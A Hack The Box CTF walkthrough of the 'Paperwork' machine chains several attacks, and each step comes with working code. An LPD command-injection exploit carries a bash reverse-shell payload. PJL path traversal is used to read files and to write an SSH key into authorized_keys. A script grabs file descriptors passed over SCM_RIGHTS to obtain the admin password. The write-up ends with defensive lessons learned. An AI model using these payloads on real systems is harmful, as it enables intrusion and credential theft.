# Hack The Box — Paperwork Write Up
🔗 HTB Machine: https://app.hackthebox.com/machines/Paperwork

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Paperwork-9FEF00?style=flat-square)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)

> A complete penetration-testing walkthrough of the Hack The Box **Paperwork** machine, covering source-code review, LPD command injection, PJL filesystem abuse, SSH key injection, UNIX socket exploitation, `SCM_RIGHTS` file-descriptor leakage, and privilege escalation.

---

## Attack Path

```text
Nmap
  ↓
Web Enumeration
  ↓
Source Code Review
  ↓
LPD Command Injection
  ↓
Initial Shell as lp
  ↓
Internal Service Enumeration
  ↓
PJL Service :9100
  ↓
PJL Directory Traversal
  ↓
Arbitrary File Read
  ↓
PJL Arbitrary File Write
  ↓
SSH Key Injection
  ↓
SSH as archivist
  ↓
paperwork-daemon Source Review
  ↓
UNIX Management Socket
  ↓
SCM_RIGHTS FD Leak
  ↓
Administrator Password
  ↓
SSH as root
```

## Contents

* [1. Reconnaissance](#1-reconnaissance)
* [2. Web Enumeration](#2-web-enumeration)
* [3. Source Code Review](#3-source-code-review)
* [4. LPD Queue Enumeration](#4-lpd-queue-enumeration)
* [5. LPD Command Injection](#5-lpd-command-injection)
* [6. Shell Stabilization](#6-shell-stabilization)
* [7. Internal Service Enumeration](#7-internal-service-enumeration)
* [8. PJL Printer Service](#8-pjl-printer-service)
* [9. PJL Filesystem Enumeration](#9-pjl-filesystem-enumeration)
* [10. Arbitrary File Read](#10-arbitrary-file-read)
* [11. Archivist SSH Directory](#11-archivist-ssh-directory)
* [12. Arbitrary File Write](#12-arbitrary-file-write)
* [13. SSH Key Injection](#13-ssh-key-injection)
* [14. SSH as Archivist](#14-ssh-as-archivist)
* [15. User Flag](#15-user-flag)
* [16. Privilege Escalation Enumeration](#16-privilege-escalation-enumeration)
* [17. `paperwork-daemon` Source Code Analysis](#17-paperwork-daemon-source-code-analysis)
* [18. Triggering the Forensic Response](#18-triggering-the-forensic-response)
* [19. `SCM_RIGHTS` File Descriptor Leak](#19-scm_rights-file-descriptor-leak)
* [20. Administrator Password](#20-administrator-password)
* [21. Root Access](#21-root-access)
* [22. Flags](#22-flags)
* [23. Lessons Learned](#23-lessons-learned)

---

# 1. Reconnaissance

I started with a full TCP Nmap scan:

```bash
nmap -p- --min-rate 5000 -T4 10.129.106.your_ip -v
```

Important open ports:

```text
22/tcp    open  ssh
80/tcp    open  http
1515/tcp  open  ifor-protocol
```

The web application used a virtual host, so I added:

```text
sudo nano /etc/hosts
10.129.106.36 paperwork.htb
```

to `/etc/hosts`.

---

# 2. Web Enumeration

I added the virtual host to `/etc/hosts`:

```text
http://paperwork.htb
```

directly revealed a page containing a **download link for the application archive**.

I downloaded the archive and extracted it:

```bash
curl -H GET http://paperwork.htb/download/archive --output paperwork-archive-v1.02
unzip paperwork-archive-v1.02
ls
```

The extracted archive contained the application's source code, including:

```text
server.py
```

This source code became the starting point for vulnerability analysis.


---

# 3. Source Code Review

Searching for dangerous process execution:

```bash
grep -RniE "subprocess|shell=True|os.system|os.popen" .
```

returned:

```text
paperwork/server.py:67:
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The relevant code was:

```python
job_name = "Unknown"

for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(
    f"echo 'Archive: {job_name}' >> /tmp/archive.log",
    shell=True
)
```

The vulnerability is a **command injection**.

The `job_name` value is taken from a user-controlled `J` field and inserted directly into a shell command while `shell=True` is enabled.

---

# 4. LPD Queue Enumeration

The LPD service was listening on TCP/1515:

```bash
nmap -sV -p 1515 10.129.106.36
```

The source code showed:

```python
VALID_QUEUE = os.environ.get("LPD_QUEUE", "default")

if queue not in VALID_QUEUE:
    ...
```

Because the validation uses `in` rather than equality, partial strings may also be accepted.

I tested several queue names and found:

```text
[+] archive: accepted
[+] arch: accepted
```

I used:

```text
archive
```

for the exploit.

---

# 5. LPD Command Injection

The LPD implementation expects the request header and job content to be sent separately.

The final exploit used:

```python
import socket

target = "10.129.106.36"
queue = "archive"
lhost = "10.10.14.116"
lport = 4444

s = socket.socket()
s.settimeout(5)
s.connect((target, 1515))

# LPD print-job request
s.sendall(b"\x02" + queue.encode() + b"\n")
s.recv(1024)

# Command injection through the J field
content = (
    f"J'; /bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'; #\n"
).encode()

# Send job header
header = b"\x02" + str(len(content)).encode() + b"\n"
s.sendall(header)

# Wait for server ACK
s.recv(1024)

# Send job content
s.sendall(content)

print(s.recv(1024))
s.close()
```

On Kali:

```bash
nc -lvnp 4444
```

The callback succeeded:

```text
connect to [10.10.14.116] from (UNKNOWN) [10.129.106.36]
```

Initial shell:

```text
lp@paperwork:/opt/LPDServer$
```

---

# 6. Shell Stabilization

I upgraded the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
export TERM=xterm
stty rows 40 columns 120
```

Checking the current identity:

```bash
whoami
id
```

Output:

```text
lp
uid=7(lp) gid=7(lp) groups=7(lp)
```

---

# 7. Internal Service Enumeration

I enumerated listening services:

```bash
ss -lntup
```

Interesting internal services:

```text
127.0.0.1:1337
127.0.0.1:9100
```

The printer-like service on port `9100` was the most interesting target.

---

# 8. PJL Printer Service

The target did not have `nc`, so I used Python sockets.

```python
python3 - <<'PY'
import socket

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
s.sendall(b"@PJL INFO ID\r\n")
print(s.recv(4096).decode(errors="replace"))
s.close()
PY
```

Response:

```text
HP LASERJET 4ML
```

A status query returned:

```text
OK
```

This confirmed that TCP/9100 exposed a **PJL printer service**.

---

# 9. PJL Filesystem Enumeration

I queried the virtual filesystem:

```text
@PJL FSDIRLIST NAME="0:/"
```

Response:

```text
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```

The `logs` directory contained:

```text
commands.log TYPE=FILE SIZE=963
```

The service therefore exposed a filesystem interface through PJL.

---

# 10. Arbitrary File Read

The PJL implementation could expose files using:

```text
@PJL FSUPLOAD NAME="PATH"
```

The filesystem translation function was:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

The service root was:

```text
/home/archivist/printer/
```

Because the path was not constrained to remain inside this root directory, directory traversal was possible.

Testing:

```text
0:/../../../etc/passwd
```

returned the real `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
...
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
...
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

This confirmed **arbitrary file read via PJL directory traversal**.

---

# 11. Archivist SSH Directory

I checked:

```text
0:/../../../home/archivist/.ssh
```

The service returned:

```text
. TYPE=DIR
.. TYPE=DIR
authorized_keys TYPE=FILE SIZE=0
```

The `authorized_keys` file existed and was empty, providing a direct path to SSH access.

---

# 12. Arbitrary File Write

The printer source contained:

```python
def handle_download(command, client):
    ...
    path, size = m.group(1), int(m.group(2))
    ...
    return fs.write(path, data)
```

The write format was:

```text
@PJL FSDOWNLOAD NAME="PATH" SIZE=N
<data>
```

Because the same vulnerable path translation was used, directory traversal could also be used during file writes.

---

# 13. SSH Key Injection

On Kali I generated a fresh Ed25519 key pair:

```bash
ssh-keygen -t ed25519 -f ~/paperwork_key -N ''
```

The public key was written into:

```text
/home/archivist/.ssh/authorized_keys
```

using the traversal path:

```text
0:/../../../home/archivist/.ssh/authorized_keys
```

The write operation returned:

```text
OK
```

I then verified the file through PJL and confirmed that the public key had been written successfully.

After discovering /home/archivist/.ssh/authorized_keys, I used the PJL filesystem write functionality to add my own SSH public key to the file.

The jetdirect.py source showed that the FSDOWNLOAD command writes attacker-controlled data to an arbitrary filesystem path:

def write(self, path, data):
    target = self._translate(path)
    try:
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with open(target, "wb") as f:
            f.write(data)
        return "OK"
    except:
        return "FILEERROR=1"

Because the path translation did not prevent directory traversal, I could target:

/home/archivist/.ssh/authorized_keys

I used the following Python script from the lp shell:

```python
python3 - <<'PY'
import socket

path = "0:/../../../home/archivist/.ssh/authorized_keys"
pubkey = b"yoursshkey\n"

s = socket.create_connection(("127.0.0.1", 9100), timeout=3)

header = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(pubkey)}\r\n'.encode()

s.sendall(header)
s.sendall(pubkey)

print(s.recv(4096).decode(errors="replace"))

s.close()
PY
```

The important part is:

@PJL FSDOWNLOAD

Unlike FSUPLOAD, which reads a file, FSDOWNLOAD causes the server to write the supplied data to the specified path.

The traversal path:

0:/../../../home/archivist/.ssh/authorized_keys

was resolved by the vulnerable path handling to:

/home/archivist/.ssh/authorized_keys

This allowed me to append my SSH public key to archivist's authorized_keys file.

After the key was written, I could authenticate to the target as archivist using the corresponding private key.

---

# 14. SSH as Archivist

Using the corresponding private key on our kali terminal:

```bash
ssh -i ~/paperwork_key archivist@10.129.106.36
```

I successfully authenticated as:

```text
archivist
```

Verification:

```bash
whoami
id
pwd
```

Output:

```text
archivist
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
/home/archivist
```

---

# 15. User Flag

The user flag was located at:

```bash
cat ~/user.txt
```

Result:

```text
c0807754e63027de8fd9c9797313eaea
```

---

# 16. Privilege Escalation Enumeration

I searched for root-owned processes:

```bash
ps auxww | grep -v grep | grep root
```

A particularly interesting process was:

```text
root 1470 ... /usr/bin/python3 /usr/bin/paperwork-daemon
```

The daemon was a Python script.

---

# 17. `paperwork-daemon` Source Code Analysis

The daemon opens a sensitive configuration file as root:

```python
try:
    admin_fd = os.open(
        "/etc/paperwork/admin_pins.conf",
        os.O_RDONLY
    )
except Exception:
    os._exit(1)
```

It also defines a UNIX management socket:

```python
socket_path = "/run/paperwork/mgmt.sock"
```

The socket permissions are explicitly configured:

```python
os.chmod(socket_path, 0o660)
os.chown(socket_path, 0, 1000)
```

System enumeration confirmed:

```text
/run/paperwork/mgmt.sock
```

with permissions:

```text
srw-rw---- root archivist
```

Therefore the `archivist` user could connect to the management socket.

---

# 18. Triggering the Forensic Response

The daemon checks the printer command log:

```python
def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False

    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()

        if any(
            trigger in content
            for trigger in [
                "FSQUERY",
                "FSUPLOAD",
                "FSDOWNLOAD"
            ]
        ):
            return True

    return False
```

Because our PJL activity was logged in:

```text
/home/archivist/printer/logs/commands.log
```

the forensic condition could be triggered by issuing a PJL command such as:

```text
@PJL FSQUERY NAME="0:/"
```

The next connection to the management socket then entered the forensic response branch.

---

# 19. `SCM_RIGHTS` File Descriptor Leak

The critical vulnerability was:

```python
log_fd = os.open(LOG_PATH, os.O_RDONLY)

evidence_bundle = array.array(
    "i",
    [log_fd, admin_fd]
)

conn.sendmsg(
    [msg],
    [
        (
            socket.SOL_SOCKET,
            socket.SCM_RIGHTS,
            evidence_bundle
        )
    ]
)
```

The root daemon was sending its open file descriptors to an unprivileged client via UNIX socket ancillary data.

In particular, the descriptors included:

```text
log_fd
admin_fd
```

The second descriptor pointed to the sensitive administrator configuration file.

---

# 20. Administrator Password

I used Python's `recvmsg()` to receive the file descriptors:

```python
import socket
import array
import os

sock_path = "/run/paperwork/mgmt.sock"

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock_path)

fds = array.array("i")

msg, ancdata, flags, addr = s.recvmsg(
    4096,
    socket.CMSG_SPACE(2 * fds.itemsize)
)

print(msg.decode(errors="replace"))

for level, ctype, data in ancdata:
    if (
        level == socket.SOL_SOCKET
        and ctype == socket.SCM_RIGHTS
    ):
        fds.frombytes(
            data[:len(data) - (len(data) % fds.itemsize)]
        )

print("Received FDs:", list(fds))

for fd in fds:
    try:
        os.lseek(fd, 0, os.SEEK_SET)

        print(f"\n===== FD {fd} =====")

        print(
            os.read(fd, 4096)
            .decode(errors="replace")
        )
    except Exception as e:
        print(f"FD {fd}: {e}")

s.close()
```

The daemon returned:

```text
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
```

Two file descriptors were received:

```text
Received FDs: [4, 5]
```

One of them contained:

```text
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

This provided the administrator credential required for the final step.

---

# 21. Root Access

Using the recovered password:

```bash
ssh root@10.129.106.36
```

I successfully authenticated as root.

Verification:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The final privilege escalation was complete.

---

# 22. Flags

### User Flag

```text
********************************
```

### Root Flag

```text
********************************
```

---

# 23. Lessons Learned

This machine demonstrates how several seemingly independent vulnerabilities can be chained together to achieve complete system compromise.

### Command Injection

Using `shell=True` with unsanitized input allowed remote command execution through the LPD service.

### Internal Services Matter

The printer service was bound only to `127.0.0.1`, but it became accessible after obtaining an initial shell.

### Path Traversal Is Dangerous

The PJL virtual filesystem did not properly restrict paths to its intended root directory, allowing arbitrary file reads and writes.

### Arbitrary Write Can Become SSH Access

Writing an attacker's public key into `authorized_keys` provided stable SSH access as another user.

### UNIX Sockets Are Part of the Attack Surface

The management socket was intentionally made accessible to `archivist`, allowing interaction with a root daemon.

### `SCM_RIGHTS` Can Leak Privileged Resources

Passing privileged file descriptors over a UNIX socket can expose sensitive files even when normal filesystem permissions prevent direct access.

### Logs Can Become Security Triggers

The daemon's forensic logic trusted log content to determine whether a security violation had occurred, which became an important part of the privilege-escalation chain.

---

# Final Attack Chain

```text
10.129.106.36
       │
       ├── HTTP :80
       │      └── Exposed source archive
       │
       └── LPD :1515
              │
              └── Command Injection
                     │
                     ▼
                    lp
                     │
                     └── localhost:9100
                            │
                            └── PJL
                                 │
                                 ├── Directory Traversal
                                 │
                                 ├── Arbitrary File Read
                                 │
                                 └── Arbitrary File Write
                                         │
                                         └── authorized_keys
                                                │
                                                ▼
                                            archivist
                                                │
                                                └── mgmt.sock
                                                      │
                                                      └── Forensic Trigger
                                                            │
                                                            └── SCM_RIGHTS
                                                                  │
                                                                  └── admin_fd
                                                                        │
                                                                        ▼
                                                                ADMIN_PASSWORD
                                                                        │
                                                                        ▼
                                                                      root
```

---

## Conclusion

**Paperwork** was a great demonstration of vulnerability chaining.

The initial foothold came from a straightforward source-code-level command injection, but the real escalation path relied on understanding internal services, PJL filesystem behavior, UNIX sockets, and Linux file-descriptor passing.

The final compromise was achieved not by exploiting a traditional SUID binary or kernel vulnerability, but by abusing the way a privileged Python daemon handled file descriptors and inter-process communication.
